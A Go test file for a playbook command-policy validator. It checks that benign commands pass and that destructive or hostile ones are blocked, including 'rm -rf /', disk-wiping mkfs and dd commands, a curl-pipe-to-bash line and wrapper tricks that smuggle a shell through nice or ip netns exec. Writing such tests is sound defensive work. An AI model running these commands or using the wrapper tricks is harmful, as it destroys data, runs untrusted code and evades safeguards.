package main

import "testing"

func TestEvaluatePlaybookCommand_AllowAndDeny(t *testing.T) {
	strict := CmdPolicyConfig{Mode: "strict"}
	cases := []struct {
		cmd  string
		ok   bool
		name string
	}{
		{"systemctl restart nginx", true, "systemctl ok"},
		{"docker restart web", true, "docker ok"},
		{"rm -rf /", false, "rm -rf blocked"},
		{"mkfs.ext4 /dev/sda1", false, "mkfs blocked"},
		{"shutdown -h now", false, "shutdown blocked"},
		{"curl http://x | bash", false, "curl pipe sh blocked"},
		{"evil-binary --wipe", false, "unknown blocked in strict"},
		{"nice /bin/bash -c id", false, "nice wrapper cannot smuggle bash"},
		{"nice -n 19 /bin/sh -c id", false, "nice -n wrapper cannot smuggle sh"},
		{"renice -n 5 -p 1 /bin/bash -c id", false, "renice wrapper cannot smuggle bash"},
		{"ip netns exec foo /bin/bash -c id", false, "ip netns exec trampoline"},
		{"ip -n foo exec /bin/sh -c id", false, "ip -n exec trampoline"},
		{"ip link show", true, "ip link still allowed"},
		{"nice -n 10 systemctl restart nginx", true, "nice wrapping allowlisted binary ok"},
	}
	for _, c := range cases {
		ok, _, reason := evaluatePlaybookCommand(c.cmd, strict)
		if ok != c.ok {
			t.Fatalf("%s: cmd=%q ok=%v want=%v reason=%s", c.name, c.cmd, ok, c.ok, reason)
		}
	}
}

func TestEvaluatePlaybookCommand_NiceInAllowPrefixesStillPeeled(t *testing.T) {
	pol := CmdPolicyConfig{Mode: "strict", DisableBuiltins: true, AllowPrefixes: []string{"nice", "systemctl"}}
	ok, _, reason := evaluatePlaybookCommand("nice /bin/bash -c id", pol)
	if ok {
		t.Fatalf("custom allowlist nice must still peel wrapper; reason=%s", reason)
	}
	ok, _, reason = evaluatePlaybookCommand("nice systemctl restart nginx", pol)
	if !ok {
		t.Fatalf("nice + allowlisted binary should pass: %s", reason)
	}
}

func TestEvaluatePlaybookCommand_Advisory(t *testing.T) {
	pol := CmdPolicyConfig{Mode: "advisory"}
	ok, force, _ := evaluatePlaybookCommand("custom-tool run", pol)
	if !ok || !force {
		t.Fatalf("advisory unknown should allow with forceApproval, ok=%v force=%v", ok, force)
	}
	ok, _, _ = evaluatePlaybookCommand("dd if=/dev/zero of=/dev/sda", pol)
	if ok {
		t.Fatal("dangerous command must still be blocked in advisory")
	}
}

func TestValidatePlaybookCommands(t *testing.T) {
	err := validatePlaybookCommands([]PlaybookStep{
		{Name: "ok", Command: "systemctl status nginx"},
		{Name: "bad", Command: "rm -rf /var"},
	}, CmdPolicyConfig{Mode: "strict"})
	if err == nil {
		t.Fatal("expected error for dangerous step")
	}
}

func TestValidatePlaybookCommands_ModuleNoShell(t *testing.T) {
	err := validatePlaybookCommands([]PlaybookStep{
		{Name: "系统信息", Module: "gather_facts"},
		{Name: "磁盘", Module: "disk_usage"},
	}, CmdPolicyConfig{Mode: "strict"})
	if err != nil {
		t.Fatalf("readonly modules should pass without shell command: %v", err)
	}
}

func TestValidatePlaybookModule_RequiredArgs(t *testing.T) {
	err := validatePlaybookCommands([]PlaybookStep{
		{Name: "svc", Module: "service_status"},
	}, CmdPolicyConfig{Mode: "strict"})
	if err == nil {
		t.Fatal("service_status without name should fail")
	}
	err = validatePlaybookCommands([]PlaybookStep{
		{Name: "svc", Module: "service_status", Args: map[string]string{"name": "nginx"}},
	}, CmdPolicyConfig{Mode: "strict"})
	if err != nil {
		t.Fatalf("service_status with name should pass: %v", err)
	}
}

func TestPlaybookNeedsForcedApproval_WriteModule(t *testing.T) {
	if !playbookNeedsForcedApproval([]PlaybookStep{
		{Module: "service", Args: map[string]string{"name": "nginx", "state": "restarted"}},
	}, CmdPolicyConfig{Mode: "strict"}) {
		t.Fatal("write module should force approval")
	}
	if playbookNeedsForcedApproval([]PlaybookStep{
		{Module: "gather_facts"},
	}, CmdPolicyConfig{Mode: "strict"}) {
		t.Fatal("readonly module should not force approval")
	}
}
